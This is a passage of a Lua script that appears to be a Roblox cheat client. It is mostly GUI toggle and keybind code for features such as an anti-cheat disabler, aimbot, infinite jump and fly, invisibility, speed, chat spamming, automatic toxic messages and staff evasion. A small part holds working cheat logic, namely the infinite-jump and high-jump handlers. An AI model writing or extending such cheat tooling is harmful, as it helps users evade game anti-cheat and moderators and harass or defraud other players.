	end)
end)

task.spawn(function()
	local InfiniteJump, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "InfiniteJump", Settings.InfiniteJump.Value, function(CallBack)
		Settings.InfiniteJump.Value = CallBack

		task.spawn(function()
			UserInputService.JumpRequest:Connect(function()
				if IsAlive(LocalPlayer) and Settings.InfiniteJump.Value == true then
					LocalPlayer.Character.Humanoid:ChangeState("Jumping")
				end
			end)
		end)	
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.InfiniteJump.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.InfiniteJump.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.InfiniteJump.KeyBind then
					Settings.InfiniteJump.Value = not Settings.InfiniteJump.Value

					if Settings.InfiniteJump.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.InfiniteJump.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local AcDisabler, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "AcDisabler", Settings.AcDisabler.Value, function(CallBack)
		Settings.AcDisabler.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.AcDisabler.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AcDisabler.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AcDisabler.KeyBind then
					Settings.AcDisabler.Value = not Settings.AcDisabler.Value

					if Settings.AcDisabler.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.AcDisabler.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local InfiniteFly, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "InfiniteFly", Settings.InfiniteFly.Value, function(CallBack)
		Settings.InfiniteFly.Value = CallBack

		task.spawn(function()
			if Settings.InfiniteFly.Value == true then
				InfiniteFlyValue = true
				InfFly()
			end

			if Settings.InfiniteFly.Value == false then
				InfiniteFlyValue = false
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.InfiniteFly.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.InfiniteFly.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.InfiniteFly.KeyBind then
					Settings.InfiniteFly.Value = not Settings.InfiniteFly.Value						

					if Settings.InfiniteFly.Value == true then
						task.spawn(function()
							InfiniteFlyValue = true
							InfFly()
						end)

						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.InfiniteFly.Value == false then
						InfiniteFlyValue = false
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local HighJump, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "HighJump", Settings.HighJump.Value, function(CallBack)
		Settings.HighJump.Value = CallBack

		task.spawn(function()
			UserInputService.JumpRequest:Connect(function()
				if IsAlive(LocalPlayer) and Settings.HighJump.Value == true then
					LocalPlayer.Character.PrimaryPart.Velocity = LocalPlayer.Character.PrimaryPart.Velocity + Vector3.new(0, 16.5, 0)
				end
			end)
		end)	
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.HighJump.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.HighJump.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.HighJump.KeyBind then
					Settings.HighJump.Value = not Settings.HighJump.Value

					if Settings.HighJump.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.HighJump.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local Invisible, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "Invisible", Settings.Invisible.Value, function(CallBack)
		Settings.Invisible.Value = CallBack

		task.spawn(function()
			if Settings.Invisible.Value == true then
				Invisibility()
			end

			task.spawn(function()
				LocalPlayer.CharacterAdded:Connect(function()
					task.wait(0.3)

					if Settings.Invisible.Value == true and IsAlive(LocalPlayer) then
						Invisibility()
					end
				end)
			end)
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.Invisible.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Invisible.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Invisible.KeyBind then
					Settings.Invisible.Value = not Settings.Invisible.Value

					task.spawn(function()
						if Settings.Invisible.Value == true then
							Invisibility()
						end

						task.spawn(function()
							LocalPlayer.CharacterAdded:Connect(function()
								task.wait(0.3)

								if Settings.Invisible.Value == true and IsAlive(LocalPlayer) then
									Invisibility()
								end
							end)
						end)
					end)

					if Settings.Invisible.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.Invisible.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local Scaffold, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "Scaffold", Settings.Scaffold.Value, function(CallBack)
		Settings.Scaffold.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.Scaffold.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Scaffold.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Scaffold.KeyBind then
					Settings.Scaffold.Value = not Settings.Scaffold.Value

					if Settings.Scaffold.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.Scaffold.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(BlatantTab, "ExpandDistance", Settings.Scaffold.ExpandDistance, 4, LayoutOrder + 2, function(CallBack)
					Settings.Scaffold.ExpandDistance = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local Aimbot, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "Aimbot", Settings.Aimbot.Value, function(CallBack)
		Settings.Aimbot.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.Aimbot.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Aimbot.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Aimbot.KeyBind then
					Settings.Aimbot.Value = not Settings.Aimbot.Value

					if Settings.Aimbot.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.Aimbot.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
	
	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(BlatantTab, "ToolCheck", Settings.Aimbot.ToolCheck, LayoutOrder + 2, function(CallBack)
					Settings.Aimbot.ToolCheck = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local NoFall, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "NoFall", Settings.NoFall.Value, function(CallBack)
		Settings.NoFall.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.NoFall.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.NoFall.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.NoFall.KeyBind then
					Settings.NoFall.Value = not Settings.NoFall.Value

					if Settings.NoFall.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.NoFall.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local Speed, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "Speed", Settings.Speed.Value, function(CallBack)
		Settings.Speed.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.Speed.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Speed.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Speed.KeyBind then
					Settings.Speed.Value = not Settings.Speed.Value

					if Settings.Speed.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.Speed.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(BlatantTab, "Speed", Settings.Speed.Speed, 23, LayoutOrder + 2, function(CallBack)
					Settings.Speed.Speed = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local Fly, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "Fly", Settings.Fly.Value, function(CallBack)
		Settings.Fly.Value = CallBack

		task.spawn(function()
			if Settings.Fly.Value == true then
				FlyValue = true
				FlyMe()
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.Fly.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Fly.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Fly.KeyBind then
					Settings.Fly.Value = not Settings.Fly.Value

					if Settings.Fly.Value == true then
						task.spawn(function()
							if Settings.Fly.Value == true then
								FlyValue = true
								FlyMe()
							end
						end)

						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.Fly.Value == false then
						FlyValue = false
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local DamageBoost, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "DamageBoost", Settings.DamageBoost.Value, function(CallBack)
		Settings.DamageBoost.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.DamageBoost.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.DamageBoost.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.DamageBoost.KeyBind then
					Settings.DamageBoost.Value = not Settings.DamageBoost.Value

					if Settings.DamageBoost.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.DamageBoost.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local ChatSpammer, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "ChatSpammer", Settings.ChatSpammer.Value, function(CallBack)
		Settings.ChatSpammer.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.ChatSpammer.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.ChatSpammer.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.ChatSpammer.KeyBind then
					Settings.ChatSpammer.Value = not Settings.ChatSpammer.Value

					if Settings.ChatSpammer.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.ChatSpammer.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(UtilityTab, "Speed", Settings.ChatSpammer.Speed, 100, LayoutOrder + 2, function(CallBack)
					Settings.ChatSpammer.Speed = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local AutoReport, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "AutoReport", Settings.AutoReport.Value, function(CallBack)
		Settings.AutoReport.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.AutoReport.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AutoReport.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AutoReport.KeyBind then
					Settings.AutoReport.Value = not Settings.AutoReport.Value

					if Settings.AutoReport.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.AutoReport.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local FpsBooster, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "FpsBooster", Settings.FpsBooster.Value, function(CallBack)
		Settings.FpsBooster.Value = CallBack

		if Settings.FpsBooster.Value == true then
			FpsBoost()
		end
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.FpsBooster.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.FpsBooster.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.FpsBooster.KeyBind then
					Settings.FpsBooster.Value = not Settings.FpsBooster.Value

					if Settings.FpsBooster.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.FpsBooster.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local PlayAgain, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "PlayAgain", Settings.PlayAgain.Value, function(CallBack)
		Settings.PlayAgain.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.PlayAgain.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.PlayAgain.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.PlayAgain.KeyBind then
					Settings.PlayAgain.Value = not Settings.PlayAgain.Value

					if Settings.PlayAgain.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.PlayAgain.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local AutoToxic, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "AutoToxic", Settings.AutoToxic.Value, function(CallBack)
		Settings.AutoToxic.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.AutoToxic.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AutoToxic.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AutoToxic.KeyBind then
					Settings.AutoToxic.Value = not Settings.AutoToxic.Value

					if Settings.AutoToxic.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.AutoToxic.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local AutoBank, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "AutoBank", Settings.AutoBank.Value, function(CallBack)
		Settings.AutoBank.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.AutoBank.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AutoBank.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AutoBank.KeyBind then
					Settings.AutoBank.Value = not Settings.AutoBank.Value

					if Settings.AutoBank.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.AutoBank.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(UtilityTab, "Range", Settings.AutoBank.Range, 30, LayoutOrder + 2, function(CallBack)
					Settings.AutoBank.Range = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local AntiStaff, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "AntiStaff", Settings.AntiStaff.Value, function(CallBack)
		Settings.AntiStaff.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.AntiStaff.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AntiStaff.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AntiStaff.KeyBind then
					Settings.AntiStaff.Value = not Settings.AntiStaff.Value

					if Settings.AntiStaff.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.AntiStaff.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(UtilityTab, "Kick", Settings.AntiStaff.Kick, LayoutOrder + 2, function(CallBack)
					Settings.AntiStaff.Kick = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local AutoBuy, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "AutoBuy", Settings.AutoBuy.Value, function(CallBack)
		Settings.AutoBuy.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.AutoBuy.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AutoBuy.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AutoBuy.KeyBind then
					Settings.AutoBuy.Value = not Settings.AutoBuy.Value

					if Settings.AutoBuy.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.AutoBuy.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local AutoKit, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "AutoKit", Settings.AutoKit.Value, function(CallBack)
		Settings.AutoKit.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.AutoKit.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AutoKit.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AutoKit.KeyBind then
					Settings.AutoKit.Value = not Settings.AutoKit.Value

					if Settings.AutoKit.Value == true then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
					end

					if Settings.AutoKit.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
